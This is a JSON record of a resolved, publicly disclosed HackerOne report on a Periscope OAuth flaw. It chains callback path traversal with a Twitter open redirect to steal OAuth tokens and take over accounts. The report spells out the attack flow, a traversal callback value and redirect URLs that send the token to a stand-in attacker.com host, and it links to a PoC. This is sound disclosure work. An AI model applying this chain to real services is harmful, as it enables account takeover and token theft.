@@ -1,0 +1,115 @@
+{
+  "id": 110293,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTAyOTM=",
+  "url": "https://hackerone.com/reports/110293",
+  "title": "Insufficient OAuth callback validation which leads to Periscope account takeover",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2016-01-12T18:13:53.536Z",
+  "submitted_at": "2016-01-12T18:13:53.536Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "filedescriptor",
+    "url": "/filedescriptor",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "X / xAI",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-04-10T19:49:04.705Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-03-18T10:14:50.923Z",
+  "team_member_agreed_on_going_public_at": "2019-04-10T19:49:04.636Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi,\nI would like to report an issue in the Periscope Twitter application which allows attacker to circumvent the callback locking to takeover victim's Periscope account which is connected to a Twitter account.\n\n#Detail\nIn the mobile Periscope app, the *consumer_key* and *consumer_secret* for Twitter application are directly embedded into the app in order to facilitate the OAuth process. The key and secret are protected by obfuscation but it can be recovered by reverse engineering. \n\nFor reference this is the key and secret for Periscope:\n```\nCONSUMER_KEY: █████████\nCONSUMER_SECRET: ███\n```\n\nIn fact, the leakage of the key and secret pair is *not* a major security concern as Twitter provides the \"Callback Locking\" protection to prevent the *callback_url* to be overwritten during the Request Token phase.\n\nPeriscope *does* employ callback locking. However, the locking for Periscope is kind of special compared to normal applications (I guess this is only for Twitter's official applications). In short, it checks whether the protocol for *callback_url* can be used to leak the OAuth token to third parties. For example, ```https://```, ```http://```, ```ftp://``` are forbidden, while ```twittersdk://``` and ```whatever://``` are allowed. The check is sufficient by itself. However, the check is under the assumption that the *callback_url* provided is a complete URI. In addition, it is discovered that it is possible to **use only the path** for *callback_url* and pass the test (e.g. a/../home is valid), and that allows the path to be traversed. Now, if an attacker can find an open redirector on Twitter, he/she can use that as *callback_url* to redirect victim with the OAuth token to attacker's control site.\n\nThe attack flow would look like this:\n\n1. Attacker uses the consumer key & secret to generate a request token\n2. Victim authorizes the Periscope app for the request token\n3. Victim is redirected to the open redirector with path traversal (e.g. /redirect?url=http://attacker.com#&oauth_token=...)\n4. Victim then lands on attacker controlled site with the token (http://attacker.com#&oauth_token=)\n5. Now the attacker gains the OAuth token from victim. He/she can use it to to exchange for *access_token* and logins victim's Periscope account.\n\n(By the way, the URL fragment in step 3 is a common technique to preserve tokens during HTTP redirect which I really like)\n\nAnd without surprise, such open redirect bug does exist. \nIn the login page (https://twitter.com/login?redirect_after_login=), the *redirect_after_login* parameter can be specified to redirect users if they have logged in. There's a check in place which rejects any URL which is not belong to a Twitter subdomain (i.e. whitelist \\*.twitter.com). However, for Twitter ads one can make a generation card and set the fallback URL to any destination, and the URL for the card happens to be a Twitter subdomain (cards.twitter.com). So after all, attackers can first setup a generation card to redirect to attacker's controlled site, and use the card URL as *redirect_after_login*.\n\nThe redirection flow:\n\n1. callback_url = a/../../login?redirect_after_login=https://cards.twitter.com/card_id\n2. https://cards.twitter.com/card_id\n3. https://attacker.com\n\nBAM BAM BAM\n\nNow, Periscope has enabled \"Login with Twitter\", that means the user will automacially authorize the app for authentication if he/she has done that once before, attacker can abuse that to make the whole attack **stealthy and without user interaction**.\n\n#PoC\n1. Prepare an Periscope account which is connected to a Twitter account, and make sure you have logged in Twitter as that account\n2. Go to https://twitter.com/attackerfoobar/status/686936815945789440\n3. Wait for a moment\n4. Your Periscope account will then be renamed as \"Pwn3d\"\n\nIn this PoC I embedded the payload in a player card to achieve maximum stealthiness, so that whenever the tweet arrives to victim's timeline the attack automatically triggers. You can also check out the standalone PoC here: https://innerht.ml/pocs/periscope-oauth-callback-hijack\n\nVideo demonstration: https://vimeo.com/151530694 (password: xauth)\n\n#Fix\nSince the open redirect bug is more like a feature and may be many of them out there, I would suggest to improve the validation on the callback locking. For example, only allow the *callback_url* to be a complete URL should do the job.",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2019-04-17T10:14:51.006Z",
+  "allow_singular_disclosure_after": -222249977.06237233,
+  "singular_disclosure_allowed": true,
+  "vote_count": 273,
+  "voters": [
+    "jellebwns",
+    "overjt",
+    "danielmgm",
+    "upx",
+    "orange303",
+    "aboalezz",
+    "he4am",
+    "n1m0",
+    "j4v40n654n",
+    "d0xing",
+    "and 263 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
